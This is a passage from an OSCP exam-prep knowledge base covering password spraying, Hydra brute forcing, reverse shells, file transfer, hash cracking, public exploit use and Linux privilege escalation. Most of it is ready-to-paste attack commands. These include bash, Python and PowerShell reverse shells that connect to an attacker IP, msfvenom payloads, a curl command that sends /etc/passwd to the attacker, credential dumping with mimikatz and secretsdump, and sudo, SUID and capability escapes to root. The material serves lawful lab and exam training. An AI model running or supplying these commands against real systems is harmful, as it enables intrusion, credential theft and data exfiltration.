- **A version number** → `[EXPLOIT-RESEARCH]`. Match version + architecture + auth exactly.
- **A login page** → default/weak creds → SQLi auth bypass → reuse creds you found.
- **An upload form** → `[WEB-UPLOAD]`.
- **A URL/file parameter** → `[WEB-LFI]` / `[WEB-RFI]` / `[WEB-SSRF]`.
- **A feature that runs a system tool** → `[WEB-CMDINJ]`.
- **Database access** → the RCE path for that DB (`[SQLI-MSSQL]` xp_cmdshell, `[SQLI-POSTGRES]` COPY, `[ENUM-MYSQL]` FILE, `[ENUM-REDIS]` write).
- **SMB/WinRM creds** → `impacket-psexec` / `evil-winrm` = instant shell.
- **SSH creds/key** → `ssh`.

## [FOOTHOLD-CREDS-SOURCES]  where credentials hide (check all of these)
Config files, `.env`, `wp-config.php` / `web.config`, database dumps, `.git` history, SNMP process arguments, LDAP `description` fields, SMB shares (GPP `Groups.xml`, `unattend.xml`, scripts), backups (`.bak`, `.zip`), source-code comments and JS files, `~/.bash_history`, `~/.ssh/`, KeePass `.kdbx` files, browser password stores, and memory (LSASS on Windows), sticky notes / `notes.txt`.

## [PASSWORD-SPRAY]  guessing passwords safely (careful — lockouts!)
**The rule:** spray **one** password across **many** users — NOT many passwords against one user (that locks the account and tips off the defender).
```bash
nxc smb $IP -u users.txt -p 'Season2025!' --continue-on-success
#   check the lockout policy FIRST so you don't lock accounts:
nxc smb $IP -u $U -p $P --pass-pol
```
- Common exam-style passwords: `Password1`, `Welcome1`, `<Company>1!`, `<Season><Year>!`, username==password, the product's default.
- **⭐ Spray one cred across MANY protocols + hosts in one shot — `nxcspray`** (a small bash wrapper around nxc; **exam-legal** because it just *runs* nxc for you, no auto-exploitation):
  ```bash
  # install once: git clone https://github.com/NTHSec/nxcspray ; chmod +x nxcspray/nxcspray
  nxcspray smb,winrm targets.txt -u e.hills -p 'Il0vemyj0b2025!'   # these protocols vs a list of hosts
  nxcspray all 10.1.45.200 -u e.hills -p 'Password1'               # ALL protocols (smb/winrm/rdp/mssql/ssh…) vs one host
  ```
  Ideal right after a pivot: one command tells you every host where the cred is valid and where you're `(Pwn3d!)`. (Same idea as looping `nxc <proto>` yourself — just faster.)
- **Brute-forcing one service** (only with evidence): `hydra -L users.txt -P rockyou.txt <service>://$IP` — noisy, slow, last resort.

## [HYDRA]  brute-forcing a login (last resort — watch for lockouts)
**What Hydra does:** rapidly tries username/password combinations against a login. `-l` (lowercase L) = one username; `-L` = a file of usernames. `-p` = one password; `-P` = a file of passwords. The `service://` part picks what to attack.
```bash
hydra -l admin      -P rockyou.txt ftp://$IP
hydra -L users.txt  -P rockyou.txt ssh://$IP -t 4        # -t 4 = only 4 parallel tries (SSH is fussy)
hydra -l george     -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://$IP   # -s PORT = login is on a NON-standard port
#   (same thing: hydra ... ssh://$IP:2222)
hydra -l admin      -P rockyou.txt rdp://$IP
hydra -C combos.txt <service>://$IP                       # combos.txt = one "user:pass" pair per line

# ⭐ The tricky, most-needed one — an HTML login FORM (POST):
#   format is  "<path>:<post-body with ^USER^ and ^PASS^>:<a string that only appears on FAILURE>"
hydra -l admin -P rockyou.txt $IP http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
hydra -L users.txt -P rockyou.txt $IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
#   use  S=<text>  instead of  F=<text>  to match a SUCCESS marker (like a redirect header) instead
# HTTP Basic auth (the grey browser popup):
hydra -l admin -P rockyou.txt -f $IP http-get /admin       # -f = stop at the first valid pair
```
**Building the http-post-form string (the confusing part):** submit the login once in Burp Suite, then copy: (1) the **exact path** (`/login.php`), (2) the **POST body** with the real username/password swapped for `^USER^`/`^PASS^`, and (3) a **string that appears only when login FAILS** (put it after `F=`). Common `-s` gotcha: `-s` is the **port**, `-p` is a single password — don't mix them up. For web logins, **ffuf is often easier** — see `[WEB-AUTH]`.

## [FILE-ANALYSIS]  you found a file/image and don't know what to do with it
> ⚠️ **Rare on OSCP, common on beginner CTFs.** Don't sink time into images unless the box clearly points you at one (`[COMMON-RABBIT-HOLES]`).
```bash
file suspicious.bin            # what type of file is it, really?
strings -n 8 suspicious.bin    # print readable text inside it (creds/flags/paths often hide here)
exiftool image.jpg             # metadata (author/comment/GPS) — sometimes leaks usernames or hints
binwalk -e firmware.bin        # find and extract files hidden/appended inside another file
steghide extract -sf image.jpg # pull data hidden inside an image (try empty passphrase, or a found password)
zsteg image.png                # stego check for PNGs
stegseek image.jpg wordlist    # brute-force a steghide passphrase with a wordlist
```
**⭐ exiftool as an actual way IN (more OSCP-relevant):** if a website runs **exiftool < 12.24** on images you upload → **CVE-2021-22204** = command execution. You upload a booby-trapped image (DjVu format) with your command inside it and the server runs it. Grab a public proof-of-concept `[LOOK-UP: CVE-2021-22204]` and pair it with `[WEB-UPLOAD]`. Check the exiftool version if the site shows you image metadata.

---

# [SHELL-QUICK]  GETTING A REVERSE SHELL

## [SHELL-QUICK]  the essentials  (one screen)
```bash
# STEP 1 — on YOUR Kali, start the listener (waits for the target to connect back):
nc -lvnp 443                                     # [MUST-MEMORIZE]  -l listen  -v verbose  -n no-DNS  -p port

# STEP 2 — make the target run ONE of these (put YOUR Kali IP where it says <IP>):
# Linux target, bash:
bash -i >& /dev/tcp/<IP>/443 0>&1                # [MUST-MEMORIZE] the classic Linux reverse shell
bash -c 'bash -i >& /dev/tcp/<IP>/443 0>&1'      # same, wrapped so it survives odd contexts
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 443 >/tmp/f    # if bash's /dev/tcp is missing
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'
# Windows target:
nc.exe <IP> 443 -e cmd.exe                       # if you transferred nc.exe first
powershell -e <base64>                           # PowerShell one-liner (build the base64 below)
```
> **Why `/dev/tcp/<IP>/443`?** Bash has a built-in trick: writing to the fake file `/dev/tcp/IP/PORT` opens a network connection. So this line connects the target's shell back to your listener. `>&` and `0>&1` wire the shell's input/output through that connection.

**Always listen on a common outbound port — 443, 80, or 8080.** Firewalls usually allow those outbound, so your shell gets home.

## [SHELL-LINUX]  reverse shells when the target is Linux
- Try bash `/dev/tcp` or python first. If `bash` isn't there, try `sh`, `nc`, `mkfifo`, `perl`, or `php -r`.
- PHP: `php -r '$s=fsockopen("<IP>",443);exec("/bin/sh -i <&3 >&3 2>&3");'`
- Web PHP shell already on the box: `<?php system($_GET['c']); ?>` then visit `?c=<url-encoded reverse shell>`.
- **Encoding tip:** when sending a shell through a web parameter, URL-encode the special characters (`&`, `;`, `|`, space). Through a command, base64 it: `echo -n 'bash -i >& /dev/tcp/<IP>/443 0>&1' | base64` on Kali → on target `echo <base64>|base64 -d|bash`.

## [SHELL-WINDOWS]  reverse shells when the target is Windows
- **PowerShell one-liner (base64-encoded)** — build it on Kali:
  ```bash
  PS='$c=New-Object System.Net.Sockets.TCPClient("<IP>",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+"PS "+(pwd).Path+"> ";$sb=[Text.Encoding]::ASCII.GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}'
  echo -n "$PS" | iconv -t UTF-16LE | base64 -w0        # paste the result after:  powershell -e
  ```
- **nc.exe:** `nc.exe <IP> 443 -e cmd.exe` (you must transfer `nc.exe` to the target first).
- **Better interactive shells:** ConPtyShell, RunasCs, or Nishang's Invoke-PowerShellTcp `[LOOK-UP]`.
- **msfvenom** (makes a ready-to-run exe — use on your ONE allowed Metasploit box, or just for a stable shell):
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o rev.exe
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe -o met.exe   # Meterpreter = MSF box only
  ```
- **Web shells:** an ASPX/JSP webshell, or `msfvenom -p ... -f aspx`.

## [SHELL-STABILIZE]  upgrading a dumb shell to a proper one (Linux)  [MUST-MEMORIZE]
A fresh reverse shell is "dumb" — no arrow keys, no tab-complete, and Ctrl+C kills it. Fix it:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # step 1: get a proper bash (try 'python' if python3 missing)
# now press: Ctrl-Z   (this backgrounds the shell, dropping you to YOUR Kali)
stty raw -echo; fg                                # step 2: fix the terminal + bring the shell back
# press Enter twice
export TERM=xterm ; export SHELL=/bin/bash        # step 3: set terminal type so clear/less/vim work
stty rows 50 columns 200                          # step 4: match your window size (run 'stty -a' locally to see yours)
```
Alternatives: `script -qc /bin/bash /dev/null`; or full `socat` TTY if socat is on both ends.
**Windows "stabilizing":** upgrade to evil-winrm / RDP / RunasCs / ConPtyShell. Native cmd/powershell reverse shells are only *semi*-interactive — avoid programs that prompt for input; run non-interactive commands.
- **Invoke-ConPtyShell** (the best Windows interactive shell): on Kali `stty raw -echo; nc -lvnp 443`; on target `IEX(IWR http://<IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <IP> 443 <rows> <cols>`.
- **Kali ships ready-made webshells:** `ls /usr/share/webshells/` (php, asp, aspx, jsp, perl) — copy one instead of writing your own.

## [REVERSE-SHELL-NOT-CONNECTING]  it's not connecting — work through this in order
```
1. Is the listener actually running, on the right port?   → nc -lvnp 443 in a live terminal
2. Right LHOST (your tun0 VPN IP, NOT eth0)?             → ip addr show tun0   ← #1 cause of failure
3. Right LPORT, and does the target allow it out?         → try 443, then 80, then 8080
4. Did the payload actually run on the target?            → did the web request/command return? read errors
5. Did encoding/quoting mangle it?                        → URL-encode web payloads; base64 the command
6. Wrong shell program?                                   → try sh instead of bash; or python; nc; perl
7. Windows AV/AMSI ate the PowerShell payload?            → base64/obfuscate it, or use nc.exe / an msfvenom exe
8. Is all outbound blocked?                               → use a BIND shell instead, or pivot, or a web shell
9. Firewall on YOUR side?                                 → check your host firewall / VPN routing
10. Still nothing?                                        → tcpdump -i tun0 port 443   (do you even see the SYN?)
```
Most common, in order: **wrong LHOST (used eth0 instead of tun0)**, listener not running, blocked port, quoting/encoding, AV.

---

# [FILETRANSFER-QUICK]  MOVING FILES BETWEEN KALI AND THE TARGET

> The model is almost always: **Kali serves a file, the target downloads it.** So you start a mini web server on Kali, then run a download command on the target.

## [QUICK]  serve from Kali
```bash
python3 -m http.server 80                          # [MUST-MEMORIZE] serves the CURRENT folder over http on port 80
impacket-smbserver share $(pwd) -smb2support       # serve current folder as a Windows SMB share (great for Windows)
#   add  -user u -password p  if the target refuses anonymous SMB
```
### Kali → Linux target (download onto the target)
```bash
wget http://<IP>/file -O /tmp/file          # [MUST-MEMORIZE]  <IP> = your Kali IP
curl http://<IP>/file -o /tmp/file
# no wget or curl on the box? use bash's built-in TCP:
exec 3<>/dev/tcp/<IP>/80; echo -e "GET /file HTTP/1.0\r\n\r\n" >&3; cat <&3
```
### Kali → Windows target (download onto the target)
```powershell
certutil -urlcache -split -f http://<IP>/file.exe file.exe          # [MUST-RECOGNIZE] classic Windows downloader
powershell -c "Invoke-WebRequest http://<IP>/file -OutFile file"    # modern PowerShell download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/f','C:\Windows\Temp\f')"   # works on OLD PowerShell too
copy \\<IP>\share\file.exe .            # pull from your impacket-smbserver share
curl.exe http://<IP>/file -o file       # certutil blocked? curl.exe exists on Win10+ (note the .exe)
```
### Target → Kali (send loot back to you)
```bash
# On Kali, receive with netcat:
nc -lvnp 443 > loot.dat                 # then on the target:  nc <IP> 443 < file
# Linux target push over HTTP (needs a server that accepts uploads):
curl -F 'f=@/etc/passwd' http://<IP>:8000/
# Windows target → your SMB share:
copy C:\loot\file.txt \\<IP>\share\
# over SSH:
scp file user@<IP>:/path          # or from Kali:  scp user@target:/path/file .
```
### base64 (when there's no working network transfer)
```bash
# on the SOURCE machine, print the file as text:
base64 -w0 file                                     # Linux
# (PowerShell:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("f"))  )
# copy that text, then on the DESTINATION rebuild it:
echo <base64text> | base64 -d > file                # Linux
# (PowerShell:  [IO.File]::WriteAllBytes("f",[Convert]::FromBase64String("<b64>"))  )
```
## [FILETRANSFER-TROUBLESHOOTING]
| Problem | Fix |
|---|---|
| certutil blocked / flagged by AV | use `curl.exe`, `bitsadmin`, PowerShell DownloadFile, or SMB |
| PowerShell download fails (proxy/TLS) | `[Net.ServicePointManager]::SecurityProtocol='Tls12'`; use the IP, not a hostname |
| Binary is corrupted (Linux ftp) | set `binary` mode before `get` |
| SMB copy denied | use `-smb2support`, or add `-user/-password` and `net use` on the target |
| No outbound at all | serve FROM the target and pull to Kali, or base64-paste |
| Exe won't run ("not a valid application") | wrong architecture — match x86 vs x64 |

---

# [PASSWORD-ATTACKS]  🔑 everything about passwords, in one place
```
FIND creds     → [CREDENTIALS-QUICK] [CREDENTIALS-SOURCES] [FOUND-CREDS] [FOUND-SSHKEY]
GUESS online   → [PASSWORD-SPRAY] (spray, lockout-aware) · [HYDRA] · netexec/kerbrute spraying
IDENTIFY hash  → [HASH-IDENTIFICATION] (what kind of hash is this?)
CRACK offline  → hashcat / john · [WORDLIST-MUTATE] · *2john converters (ssh/zip/keepass/office)
DUMP creds     → mimikatz/secretsdump/lsassy/LaZagne/SAM (Windows)
USE without cracking → Pass-the-Hash (nxc -H / evil-winrm -H / psexec -hashes) · Pass-the-Ticket
AD-specific    → [AD-KERBEROAST] [AD-ASREP] gpp-decrypt · DCSync
```
> **The winning order:** found a password → **spray it everywhere first**. Got a *hash*? → **try Pass-the-Hash before cracking** (often you don't need the plaintext). Must crack? → rockyou + rules. Still stuck? → build a custom list from the site (`[WORDLIST-MUTATE]`). Still nothing? → **move on** — don't grind a strong hash for hours (`[COMMON-RABBIT-HOLES]`).

# [CREDENTIALS-QUICK]  USING CREDENTIALS

## [QUICK]  the golden rule: every credential → try it EVERYWHERE
```bash
nxc smb   $IP -u u -p p         # test on SMB (add --local-auth for local, non-domain accounts)
nxc winrm $IP -u u -p p         # test on WinRM (Pwn3d! = you can get a shell here)
nxc ldap  <dc> -u u -p p        # validate against the domain / dump LDAP
nxc mssql $IP -u u -p p         # test on MSSQL (→ xp_cmdshell if it works)
nxc rdp   $IP -u u -p p         # test on RDP (Pwn3d! = you can log in to the desktop)
ssh u@$IP ; evil-winrm -i $IP -u u -p p          # actually log in wherever the cred worked
```
Also try the same password as **other usernames**, with small **variations**, and as a **domain** account (`-d DOMAIN`) vs a **local** account (`--local-auth`).

## [CREDENTIALS-SOURCES]  where to loot creds after you get a shell
**Linux:** `/etc/passwd` + `/etc/shadow` (need root), `~/.ssh/id_*` keys, `~/.bash_history`, `/var/www/**/config*`, `.env` files, DB configs, cron scripts, backups, `find / -name "*.kdbx"` (KeePass), mounted shares.
**Windows:** `secretsdump.py 'DOMAIN/u:p'@host` (dumps SAM/LSA/NTDS), the SAM+SYSTEM registry hives, an LSASS memory dump (mimikatz/comsvcs), `cmdkey /list` + `runas /savecred`, DPAPI, PowerShell history (`ConsoleHost_history.txt`), `unattend.xml`, GPP `cpassword`, KeePass, browser creds, autologon registry (`DefaultPassword`).

## [HASH-IDENTIFICATION]  "I found a hash — what is it?"
> **What's a hash?** A password stored as a scrambled fingerprint. You can't un-scramble it, but you can guess passwords, hash each guess, and compare — that's "cracking."
- Identify it: `hashid <hash>`, `hash-identifier`, or `nth --text <hash>` (name-that-hash). Or recognise it by shape:
  - **32 hex characters** → MD5 or NTLM (NTLM if it came from a Windows dump).
  - **Linux `/etc/shadow`** uses the format `$id$salt$hash` — the `$id$` says which algorithm: `$1$`=md5crypt, `$5$`=sha256crypt (`-m 7400`), **`$6$`=sha512crypt (`-m 1800`)**, `$y$`=yescrypt. Example: `root:$6$SALT$HASH:…` = root's password as SHA-512crypt.
  - `$2a$` / `$2b$` → bcrypt.
  - `aad3b435...:<32hex>` → an LM:NTLM pair (use the NTLM half, after the colon).
  - `user::DOMAIN:...` (long) → **NetNTLMv2** (what Responder captures).
  - `$krb5tgs$23$...` → Kerberoast hash. `$krb5asrep$23$...` → AS-REP hash.
- **hashcat mode numbers to memorise** (`-m` must match the hash type):
  ```
  NTLM 1000 | NetNTLMv2 5600 | Kerberoast 13100 | AS-REP 18200
  md5crypt 500 | sha512crypt 1800 | bcrypt 3200 | domain-cached 2100
  raw-md5 0 | raw-sha1 100 | NetNTLMv1 5500 | JWT(HS256) 16500 | KeePass 13400
  ```
- **Crack it:**
  ```bash
  hashcat -m 1000 hashes.txt rockyou.txt -O                  # crack NTLM with the rockyou wordlist; -O = optimized/faster
  hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule   # Kerberoast + password mutations
  john --format=<fmt> --wordlist=rockyou.txt hashes.txt      # john is an alternative; it can auto-detect the type
  ```
  **Command anatomy:** `hashcat -m <TYPE> <your-hash-file> <Kali-wordlist> [-r rules] [-O]`. `-m` picks the hash type; `-a 3 ?u?l?l?d?d` switches to brute-forcing a *pattern* instead of a wordlist.
- **Wordlists/rules live at:** `/usr/share/wordlists/rockyou.txt` (gunzip it once), SecLists; rules `best64`, `rockyou-30000`, `OneRuleToRuleThemAll` `[LOOK-UP]`.

## [WORDLIST-MUTATE]  building a custom wordlist (when rockyou fails)
**Best practice — mutate on the fly with "rules" (no need to pre-build a file):**
```bash
hashcat -m <mode> hash.txt base.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> hash.txt base.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule   # bigger, slower
```
**Generate a mutated list to a FILE** (to feed hydra/nxc, which can't do rules themselves):
```bash
hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
john --wordlist=base.txt --rules=Jumbo --stdout > mutated.txt
```
**Build a base list from the target itself** (a very common OSCP move — the password is often a company word):
```bash
cewl -d 2 -m 5 http://$IP -w words.txt     # scrape the website into a wordlist (-d depth, -m min length)
cupp -i                                     # interactive: build a list from a person's name/dates/pets
crunch 8 10 -t Summer@@@@ -o w.txt          # generate by pattern (@=letter, %=digit, ^=symbol)
```
**hashcat rule syntax** (each LINE is one rule; the functions apply left→right to every word):
```
$X = append char X     ^X = prepend char X     c = Capitalize (u=UPPER, l=lower, t=toGGLE)
sXY = substitute X→Y (leetspeak: sa@ ss$ so0)   d = duplicate word   r = reverse   [ ]=delete first/last
# example: the rule  "$1 c $!"  turns  password → password1 → Password1 → Password1!
printf '$1 c $!\n$2 c $!\n' > demo.rule
hashcat --stdout wordlist.txt -r demo.rule       # PREVIEW what candidates it makes (doesn't crack — just shows)
hashcat -m <mode> hash.txt wordlist.txt -r demo.rule
```
**When to bother:** rockyou failed but you have a hint (company name, a word you found, a `Season+Year!` pattern). Don't grind giant rule-sets against a strong Kerberos/bcrypt hash — move on.
- **Don't crack if you can pass:** got an NTLM hash? Try **Pass-the-Hash** first (`nxc -H`, `evil-winrm -H`, `psexec -hashes`) — you may never need the plaintext.

## [CREDENTIALS-TOOLS]
- `secretsdump.py` (impacket) — dump SAM/LSA/NTDS, and DCSync.
- `mimikatz` — pull creds/tickets from Windows memory.
- `hashcat` / `john` — offline cracking.
- `ssh2john`, `keepass2john`, `zip2john`, `office2john` — turn a protected file into a crackable hash.
- `nxc` / `crackmapexec` — spraying and Pass-the-Hash.

---

# [EXPLOIT-RESEARCH]  finding and using public exploits

## [QUICK]  the pipeline
```
KNOWN VULNERABLE VERSION → searchsploit / web CVE search → pick a match → READ the code
→ verify it matches (version + arch + auth + language) → edit it (your LHOST/LPORT/paths) → test → run
```
## [SEARCHSPLOIT]  the offline Exploit-DB search tool
```bash
searchsploit remote smb microsoft windows       # keywords are AND-ed together (searches title + path)
searchsploit apache 2.4.49                       # product + version
searchsploit -t apache                           # -t = search TITLES only (far fewer false hits)
searchsploit --exclude="dos" wordpress 5.7       # drop the denial-of-service noise
searchsploit --cve 2021-41773                    # search by CVE id
searchsploit --nmap scans/scan.xml               # search straight from your nmap XML (scan with -oX)
# once you find one:
searchsploit -x 50383                            # -x = read/examine exploit #50383
searchsploit -m 50383                            # -m = copy ("mirror") it into your current folder
searchsploit -p 50383                            # -p = print its full file path
searchsploit -u                                  # update the local exploit database
```
**Reading the results:** the folder in the **path** tells you the type — `/remote/` = remote exploit, `/webapps/` = web app, `/local/` = local privilege escalation, `/dos/` = **denial-of-service (crashes things — usually useless for getting in, skip it)**. **Tip:** searchsploit matches literal text, so an over-specific version can miss — search broader (`apache 2.4`) and eyeball it, or use `-t`. Always **read the exploit** with `-x` before running it.
- On the web, search `"<product> <version> exploit"`, `"<product> CVE"`, GitHub, Exploit-DB, PacketStorm. Prefer proof-of-concepts you can **read**.
- **Match precisely:** exact version (off-by-one breaks it), architecture (x86/x64), whether it needs a login (authed vs unauth), and interpreter version (Python2 vs 3).
- **Before running, read it:** what does it do? Does it need a listener or arguments? Could it crash the service? Change any hard-coded IPs/ports/paths to yours.
- **Common breakage:** Python2 syntax (`print "x"`), missing libraries, wrong `LHOST`, wrong target offset, a needed header/cookie, or a required valid session.
## [EXPLOIT-RESEARCH-CAUTIONS]
- **Never run an unknown PoC blindly** — some are booby-trapped to attack *you*. Read every line; watch what it connects to.
- Memory-corruption/DoS exploits can crash the box (costing you a revert). Prefer stable, logic-based exploits.
- If an exploit "should" work but doesn't: recheck the version match, try the manual technique the CVE describes, or find another PoC.
- **Exam rule:** you may use public exploit code you understand and run by hand; you may NOT use Metasploit beyond your one allowed target. Screenshot everything for the report.

---
*End Volume 3. Next: Volume 4 — going from a normal user to root/SYSTEM (privilege escalation).*


# OSCP+ KNOWLEDGE BASE — VOLUME 4
## BECOMING ROOT / SYSTEM: PRIVILEGE ESCALATION (Linux & Windows)

> **Read this box first.**
> "Privilege escalation" ("privesc") = you have a shell as a *normal* user, and you want to become the *all-powerful* user. On **Linux** that top user is **root**. On **Windows** it's **SYSTEM** (or a local Administrator). The final flag (`proof.txt`) almost always requires it.
>
> **The mindset:** you don't "hack" your way to root — you find something the admin *misconfigured* (a program you're allowed to run as root, a script root runs that you can edit, a password left in a file) and abuse it. So privesc = **enumerate thoroughly, then spot the one thing that's wrong.**
>
> **Two best friends:**
> - **GTFOBins** (gtfobins.github.io) — for Linux: look up any program you're allowed to run elevated; it tells you the exact escape.
> - **LOLBAS** (lolbas-project.github.io) — the Windows equivalent.
>
> Placeholders: `<IP>` = **your Kali** IP (for reverse shells / file serving). `$IP` = the target. `<you>` = your current username on the target.

---

# [LINUX-PRIVESC]  getting root on Linux

## [LINUX-PRIVESC-QUICK]  first 60 seconds on any Linux shell  (one screen)
```bash
id ; sudo -l ; hostname ; uname -a                    # [MUST-MEMORIZE] who am I, what can I sudo, which kernel
#   id      = your user + groups (are you in 'sudo', 'docker', 'lxd'? those are shortcuts to root)
#   sudo -l = what you're allowed to run as root (the #1 quick win — check this FIRST)
#   uname -a= kernel version (only for kernel exploits, which are a LAST resort)
find / -perm -4000 -type f 2>/dev/null                # find "SUID" programs (run as their owner — often root)
find / -writable -type d 2>/dev/null | head           # folders you can write to
cat /etc/crontab ; ls -la /etc/cron.*                 # scheduled jobs (a root job you can tamper with = win)
getcap -r / 2>/dev/null                               # "capabilities" (special powers on specific programs)
ls -la /home/* ; cat ~/.bash_history ; ls -la ~/.ssh  # loot: other users, past commands, SSH keys
ss -tlnp ; cat /etc/passwd                            # internal-only services + the user list
# then let a script do the heavy lifting:
./linpeas.sh | tee linpeas.txt
```
**Check these in order (easiest wins first):** `sudo -l` → SUID/GTFOBins → a writable cron/script → capabilities → creds in files → **kernel exploit (only as a last resort — it can crash the box)**.

## [LINPEAS-WORKFLOW]  using the automated enumerator
1. Get it onto the target and run it: `curl http://<IP>/linpeas.sh | sh`, or download it, `chmod +x linpeas.sh`, `./linpeas.sh`. Save the output with `| tee linpeas.txt`.
2. **Read the RED/YELLOW highlights first** — RED+YELLOW together = "this is very likely your way up."
3. **Don't trust it blindly** — linpeas misses things and also flags harmless noise. Confirm each candidate by hand before exploiting.
4. Prioritise these sections: "Interesting writable files", "SUID", "Sudo", "Capabilities", "Cron", "Passwords/creds", "Software with known exploits".
- **Quieter alternative — `lse.sh` (linux-smart-enumeration):** if linpeas is overwhelming, run `./lse.sh -l1` (only interesting findings) then `-l2` (everything). It's also read-only and exam-legal — a good second opinion.

## [GTFOBINS-WORKFLOW]  how to actually use GTFOBins
- Any program that shows up in `sudo -l`, or as a SUID binary, or with a capability → look its name up on **GTFOBins**.
- Pick the section that matches *your* case — **Sudo**, **SUID**, or **Capabilities** — and copy the exact escape it gives.
- The mental test: does this program let me **run a command**, **read a file**, **write a file**, or **spawn a shell** as the elevated user? If any of those → you win.

## [LINUX-SUDO]  abusing `sudo` rights
**What it is:** `sudo` lets you run specific commands as root. If you're allowed to run the *wrong* command, you can turn it into a full root shell.
**Detect:** `sudo -l`.
**Read the output:** `(ALL) NOPASSWD: /path/bin` = you can run that as root with no password. `(root) ALL` = full root already. `env_keep`/`LD_PRELOAD` present = an environment-hijack trick is possible. If it's a **script you can edit** = instant win.
**Exploit:**
- Look the allowed program up on **GTFOBins** (Sudo section). Examples: `sudo find . -exec /bin/sh \; -quit` · `sudo vim -c ':!/bin/sh'` · `sudo less` then `!sh` · `sudo awk 'BEGIN{system("/bin/sh")}'` · `sudo env /bin/sh`.
- `(ALL) NOPASSWD: /usr/bin/python3` → `sudo python3 -c 'import os;os.system("/bin/sh")'`.
- **LD_PRELOAD** (when `env_keep+=LD_PRELOAD` is set): compile a tiny malicious `.so` library whose startup code spawns a shell → `sudo LD_PRELOAD=/tmp/x.so <allowed cmd>`.
- An editable script that runs as root → insert a reverse shell, or `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`.
- Specific vulnerable sudo versions: **CVE-2021-3156 (Baron Samedit)**, **CVE-2019-14287 (`sudo -u#-1`)** `[LOOK-UP]`.
**Verify:** `id` shows `uid=0(root)`, or run `bash -p` after making a SUID bash.
**Not a vector if:** the allowed program has no GTFOBins escape and no input you can tamper with.

## [LINUX-SUID] / SGID  abusing SUID programs
**What it is:** a "SUID" program always runs as its *owner*, no matter who launches it. If a root-owned SUID program can be made to run your commands, you become root.
**Detect:** `find / -perm -4000 -type f 2>/dev/null` (SUID); use `-2000` for SGID.
**Read it:** ignore the normal ones (`ping`, `su`, `sudo`, `mount`, `passwd`, `pkexec`) — look for **unusual** or **custom** programs, and known tools that have a GTFOBins entry.
**Exploit:**
- GTFOBins SUID section (e.g. `find`, old `nmap --interactive`, `bash -p`, `cp`, `env`, `python` if it's SUID).
- **A custom SUID binary:** run `strings` / `ltrace` on it — it often calls another program **without a full path** → hijack it via PATH (`[LINUX-PATH]`), or it calls `system("service …")` → hijack that.
- `pkexec` present → **PwnKit / CVE-2021-4034** (extremely common on older boxes) `[LOOK-UP]`.
**Verify:** `bash -p` (the `-p` keeps the elevated privileges) then `id`.
**Not a vector if:** the binary drops its privileges internally or has nothing you can influence.

## [LINUX-CAP]  Linux capabilities
**What it is:** "capabilities" are slivers of root power granted to a single program. The dangerous ones let a program change its user ID or read/write any file.
**Detect:** `getcap -r / 2>/dev/null`.
**Read it:** `cap_setuid+ep` on python/perl = instant root. `cap_dac_read_search` = read any file (e.g. `/etc/shadow`). `cap_dac_override` = write any file.
**Exploit (`cap_setuid` → root):**
```bash
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'              # if python has cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'     # if perl does
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit         # if gdb does
# cap_dac_read_search → read /etc/shadow with that binary → crack root's hash
# cap_dac_override    → overwrite /etc/passwd, a root cron, or sudoers
```
**Verify:** `id` → `uid=0(root)`. Only `cap_setuid`/`cap_setgid`/`cap_dac_*` on a program that **runs code** (python/perl/gdb/ruby) are exploitable; things like `cap_net_raw` on `ping` are not. Look up the exact command on **GTFOBins → Capabilities**.

## [LINUX-CRON]  scheduled jobs (cron)
**What it is:** the system runs certain scripts on a schedule, often as root. If you can edit a script root runs — or write into a folder it uses — your code runs as root.
**Detect:** `cat /etc/crontab`; `ls -la /etc/cron.d /etc/cron.daily`; run **`pspy`** to watch processes live and catch hidden or short-interval jobs.
**Read it:** a script that runs **as root** and is **writable by you** (or lives in a writable folder, or uses a `*` wildcard, or calls a program by short name) = win.
**Exploit:**
- Writable script → append a reverse shell, or `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`.
- **Wildcard injection** (a job like `tar/chown/rsync *` in a folder you can write to): drop files whose *names* are command options — see `[LINUX-WILDCARD]`.
- Calls a program by short name → PATH hijack (`[LINUX-PATH]`).
**Verify:** wait for the interval; catch the shell / use the SUID bash. **Troubleshoot:** confirm it actually runs (`pspy`), and that you can write both the *script* and its *folder*.

## [LINUX-PATH]  PATH hijacking
**What it is:** if a privileged program calls another command by its short name (`service` instead of `/usr/sbin/service`), Linux searches folders in your `$PATH` to find it. Put a fake one earlier in the PATH and yours runs instead.
**Detect:** a SUID/cron/sudo program calls another command by name (find out via `strings` / `ltrace -f ./bin`).
**Exploit:** `echo '/bin/bash -p' > /tmp/service; chmod +x /tmp/service; export PATH=/tmp:$PATH`, then trigger the parent program.
**Verify:** the parent runs your fake as root.

## [LINUX-WILDCARD]  wildcard injection
A cron/script runs `tar czf backup.tar.gz *` (or `chown *`, `rsync *`) in a folder you can write to. Because `*` expands to the filenames, you plant files whose names are actually command-line options:
```bash
cd <dir>
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > x.sh
